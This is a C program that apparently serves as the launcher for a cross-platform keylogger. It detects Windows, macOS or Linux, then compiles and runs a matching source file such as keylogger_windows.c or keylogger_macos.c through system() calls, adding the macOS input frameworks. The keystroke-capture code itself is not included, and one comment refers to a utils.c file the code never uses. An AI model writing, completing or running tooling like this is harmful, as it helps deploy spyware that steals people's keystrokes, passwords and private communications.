#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function to get the operating system
const char* getOS() {
#ifdef _WIN32
    return "Windows";
#elif __APPLE__
    return "macOS";
#elif __linux__
    return "Linux";
#else
    return "Unknown";
#endif
}

int main() {
    const char *os = getOS();
    char compileCommand[512];
    char runCommand[256];
    const char *sourceFile;
    const char *executableName;

    if (strcmp(os, "Windows") == 0) {
        sourceFile = "keylogger_windows.c";
        executableName = "keylogger_windows.exe";
    } else if (strcmp(os, "macOS") == 0) {
        sourceFile = "keylogger_macos.c";
        executableName = "keylogger_macos";
    } else if (strcmp(os, "Linux") == 0) {
        sourceFile = "script_linux.c";
        executableName = "script_linux";
    } else {
        printf("Unsupported operating system.\n");
        return 1;
    }

    // Form the compile command
    char frameworkFlags[128] = ""; // Variable to hold framework flags
#ifdef __APPLE__
    strcat(frameworkFlags, " -framework ApplicationServices -framework Carbon"); // Add framework flags for macOS
#endif

    snprintf(compileCommand, sizeof(compileCommand), "gcc -o %s %s%s", executableName, sourceFile, strcmp(os, "macOS") == 0 ? frameworkFlags : "");

    // Form the run command
    snprintf(runCommand, sizeof(runCommand), "%s%s", strcmp(os, "Windows") == 0 ? "" : "./", executableName);

    // Compile the target C file along with utils.c
    if (system(compileCommand) == 0) {
        printf("Compilation successful.\n");
        // Run the compiled executable
        if (system(runCommand) == 0) {
            printf("Execution successful.\n");
        } else {
            printf("Execution failed.\n");
        }
    } else {
        printf("Compilation failed.\n");
    }

    return 0;
}
